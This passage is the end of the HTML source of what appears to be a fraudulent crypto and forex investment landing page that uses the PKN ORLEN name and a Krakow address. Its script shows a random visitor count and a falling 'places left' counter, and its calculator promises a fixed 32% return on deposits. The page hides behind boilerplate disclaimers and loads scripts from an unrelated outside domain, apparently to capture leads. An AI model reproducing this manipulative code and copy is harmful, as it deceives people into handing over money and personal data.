81.5196C30.735 81.7819 30.8007 81.9785 30.9973 82.1099C31.3917 82.438 31.9827 82.5044 32.6395 82.7016C33.6243 83.0296 34.0845 83.5549 34.0845 84.4095C34.0845 85.4601 33.2962 86.1826 31.917 86.1826C30.9973 86.1826 30.144 85.7881 29.6187 85.0656L30.2755 84.541ZM37.7626 86.1826C36.1862 86.1826 35.2671 85.132 35.2671 83.0296C35.2671 81.0594 36.2526 79.9431 37.7626 79.9431C38.8138 79.9431 39.6021 80.5348 39.9301 81.5203L39.0761 81.8483C38.8796 81.0594 38.3543 80.6656 37.6969 80.6656C36.7121 80.6656 36.1862 81.4545 36.1862 83.0303C36.1862 84.6725 36.7121 85.4607 37.7626 85.4607C38.4194 85.4607 38.9447 85.0663 39.3391 84.2781L40.0616 84.6725C39.5357 85.7224 38.8132 86.1826 37.7626 86.1826ZM41.7031 77.7106H42.4914V80.9286C43.2138 80.2061 43.8048 79.9431 44.5931 79.9431C45.6436 79.9431 46.2353 80.5348 46.2353 81.5853V86.1168H45.3813V81.9134C45.3813 81.0601 45.1183 80.6656 44.3308 80.6656C43.7398 80.6656 43.083 80.9286 42.4914 81.5853V86.1168H41.7031V77.7106ZM52.8678 84.8027C52.3419 85.7224 51.5543 86.1826 50.4381 86.1826C48.8616 86.1826 47.9426 85.132 47.9426 83.0296C47.9426 81.0594 48.9273 79.9431 50.3723 79.9431C51.8173 79.9431 52.737 80.9937 52.737 82.9652V83.2275H48.8623V83.4248C48.8623 84.7389 49.519 85.4607 50.5045 85.4607C51.227 85.4607 51.8837 85.1327 52.2124 84.4102L52.8678 84.8027ZM51.8173 82.5044C51.8173 81.323 51.2263 80.665 50.3723 80.665C49.4526 80.665 48.9273 81.3224 48.8616 82.5044H51.8173ZM58.582 77.7106H60.8803C63.0477 77.7106 64.0983 78.3009 64.0983 79.8116C64.0983 80.7314 63.6388 81.3224 62.719 81.6511C63.7045 82.0455 64.3612 82.768 64.3612 83.8185C64.3612 85.3279 63.2443 86.1168 61.1426 86.1168H58.5813V77.7106H58.582ZM59.501 78.4331V81.323H61.2747C62.5225 81.323 63.1792 80.7964 63.1792 79.8123C63.1792 78.8926 62.4567 78.4337 61.0118 78.4337H59.501V78.4331ZM59.501 82.1099V85.3279H61.209C62.719 85.3279 63.3765 84.8691 63.3765 83.7521C63.3765 82.6352 62.654 82.1099 61.209 82.1099H59.501ZM66.8568 77.8421H67.7765V78.8926H66.8568V77.8421ZM68.6955 77.8421H69.6152V78.8926H68.6955V77.8421ZM68.2367 79.9431C69.8124 79.9431 70.7979 81.0601 70.7979 83.0296C70.7979 85.0656 69.8124 86.1826 68.2367 86.1826C66.6595 86.1826 65.6754 85.0656 65.6754 83.0296C65.6747 81.0594 66.6595 79.9431 68.2367 79.9431ZM68.2367 85.5252C69.2872 85.5252 69.8789 84.6719 69.8789 83.0961C69.8789 81.4539 69.2872 80.6656 68.2367 80.6656C67.1861 80.6656 66.5945 81.4545 66.5945 83.0303C66.5945 84.6719 67.1861 85.5252 68.2367 85.5252ZM72.5052 80.0089H73.3598V81.3874C73.8187 80.4033 74.3439 79.9425 75.1328 79.9425H75.3301V80.7958H75.2636C74.4103 80.7958 73.7529 81.4532 73.3598 82.7009V86.1162H72.5052V80.0089ZM76.6422 84.541C77.1024 85.1971 77.6927 85.5252 78.3502 85.5252C79.1391 85.5252 79.5979 85.0663 79.5979 84.4746C79.5979 83.6871 78.9418 83.6213 77.7585 83.2269C76.708 82.9646 76.1827 82.3736 76.1827 81.5847C76.1827 80.6005 76.9703 79.9425 78.0221 79.9425C78.9418 79.9425 79.6643 80.2705 80.1896 80.9279L79.6643 81.5196C79.2041 80.9279 78.6789 80.5999 78.0872 80.5999C77.4311 80.5999 77.0367 80.993 77.0367 81.5196C77.0367 81.7819 77.1675 81.9785 77.3647 82.1099C77.7592 82.438 78.3502 82.5044 78.9418 82.7016C79.9924 83.0296 80.4512 83.5549 80.4512 84.4095C80.4512 85.4601 79.5979 86.1826 78.2838 86.1826C77.2996 86.1826 76.4443 85.7881 75.9855 85.0656L76.6422 84.541ZM86.5605 84.8027C86.0352 85.7224 85.2463 86.1826 84.1301 86.1826C82.5543 86.1826 81.6346 85.132 81.6346 83.0296C81.6346 81.0594 82.6187 79.9431 84.0637 79.9431C85.5086 79.9431 86.4284 80.9937 86.4284 82.9652V83.2275H82.5543V83.4248C82.5543 84.7389 83.2104 85.4607 84.1965 85.4607C84.919 85.4607 85.575 85.1327 85.9031 84.4102L86.5605 84.8027ZM85.5086 82.5044C85.5086 81.323 84.9183 80.665 84.0637 80.665C83.144 80.665 82.6187 81.3224 82.5543 82.5044H85.5086Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M17.9287 59.3867L5.64709 66.348V73.8352L24.4962 63.0642L17.9287 59.3867Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M37.6312 62.0144L32.0485 58.7964H18.9136L31.0637 65.6926L37.6312 62.0144Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M57.465 51.7681L32.0485 66.2829H45.2498L63.9017 55.5777L57.465 51.7681Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M77.1675 54.4607L71.4546 51.2427H58.3848L70.5349 58.2703L77.1675 54.4607Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M122.353 37.254L84.6547 58.7958H71.5204L122.353 29.8325V37.254Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
        </div>
      </section>
    </main>

    <style>
      .box {
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 14px;
      }

      .box img {
        margin: 0 20px 0 0;
      }
    </style>
    <footer>
      <div
        class="container mx-auto py-4 text-center text-white sm:leading-relaxed sm:text-xs"
      >
        <div class="box">
          <img style="width: 80px" src="img/9.svg" alt="" />
          PKN ORLEN ul. Opolska 114, 31-323, KRAKOW
        </div>
        <div class="important" style="font-size: 14px; margin-top: 20px">
          IMPORTANT: Earnings and Legal Disclaimers Earnings and income
          representations made by <span class="domain">178.63.171.231</span>,
          (collectively “This Website”) only used as aspirational examples of
          your earnings potential. The success of those in the testimonials and
          other examples are exceptional results and therefore are not intended
          as a guarantee that you or others will achieve the same results.
          Individual results will vary and are entirely dependent on your use of
          <span class="domain">178.63.171.231</span>. This Website is not
          responsible for your actions. You bear sole responsibility for your
          actions and decisions when using products and services and therefore
          you should always exercise caution and due diligence. You agree that
          this Website is not liable to you in any way for the results of using
          our services. See our Website terms of use for our full disclaimer of
          liability and other restrictions. Trading can generate notable
          benefits, however, it also involves the risk of partial/full loss of
          the invested capital, therefore, you should consider whether you can
          afford to invest. ©2021 <br /><br />

          USA REGULATION NOTICE: Trading Forex, CFDs and Cryptocurrencies is not
          regulated within the United States. Invest in Crypto is not supervised
          or regulated by any financial agencies nor US agencies. Any
          unregulated trading activity by U.S. residents is considered unlawful.
          This Website does not accept customers located within the United
          States or holding an American citizenship. This Website is not
          responsible for actions of customers located within the United States
          or holding an American citizenship. Customers located within the
          United States or holding an American citizenship bear sole
          responsibility for their actions and decisions when using products and
          services of this Website. In any and all circumstances the choice to
          use the Website, the Service and/or the Software is under full
          responsibility of User, who should comply with the current
          legislation.
        </div>
      </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="js/videoJS/video.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/js/ion.rangeSlider.min.js"></script>

    <script src="js/ion.rangeSlider.min.js">  

</script>

    <script src="js/jquery.fancybox.min.js"></script>

    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"
    ></script>
    <script>
      document
        .querySelectorAll(".domain")
        .forEach((item) => (item.textContent = window.location.host));

      const randMan = document.getElementById("rand_man");
      const randPlaces = document.getElementById("rand_places");
      function randomPlace(count) {
        let refreshIntervalId = setInterval(() => {
          if (count === 1) {
            clearInterval(refreshIntervalId);
          }
          randPlaces.innerText = count--;
        }, 7000);
      }
      randomPlace(13);

      function randomInteger(min, max) {
        let rand = min - 0.5 + Math.random() * (max - min + 1);
        return Math.round(rand);
      }
      randMan.innerText = randomInteger(100, 200);
        $(function () {
          console.log($(".js-range-slider"));
          $(".js-range-slider").ionRangeSlider({
            skin: "round",
            min: 190,
            max: 212000,
            from: 190,
            max_postfix: "+",
            postfix: "EUR",
            grid: true,
            onStart: function (data) {
              $("#calcResult").text(
                Math.round(data.from * 0.32 + data.from) + " EUR"
              );
            },
            onChange: function (data) {
              $("#calcResult").text(
                Math.round(data.from * 0.32 + data.from) + " EUR"
              );
            },
          });
        });




      $(".license-block").slick({
        dots: false,
        infinite: true,
        speed: 300,
        fade: true,
        cssEase: "linear",
        slidesToShow: 1,
        slidesToScroll: 1,
        // autoplay: true,
        // autoplaySpeed: 6000,
        // arrows: false,
        prevArrow:
          "<button type='button' class='slick-prev pull-left slick-arrow'><img src='img/arrow.png' alt=''></button>",
        nextArrow:
          "<button type='button' class='slick-next pull-right slick-arrow'><img src='img/arrow1.png' alt=''></button>",
      });


    </script>

        integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
      <script src="https://usahomerelief.net/adict/intlTelInput.js"></script>
      
      <script src="https://usahomerelief.net/adict/adict.js"></script>
      <script src="https://usahomerelief.net/adict/utils.js"></script>


    <div id="torrent-scanner-popup" style="display: none"></div>

  </body>
</html>
